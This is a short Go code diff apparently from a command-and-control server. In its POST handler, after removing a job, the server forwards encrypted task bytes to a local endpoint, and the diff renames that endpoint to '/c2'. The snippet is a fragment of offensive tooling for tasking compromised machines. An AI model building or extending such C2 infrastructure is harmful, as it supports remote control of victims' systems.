@@ -99,7 +99,7 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 			} else {
 				remove_job(listener, i)
 				json_byte = append(json_byte, 0x00, IntToUint8(i))
-				Send_Bytes_to(w, json_byte, "http://localhost:50049", expectedHeaders)
+				Send_Bytes_to(w, json_byte, "http://localhost:50049/c2", expectedHeaders)
 				res = append(res, make_fucker(listener, i)...)
 				res = eAES.EncryptData(res)
 				return res, true // commit
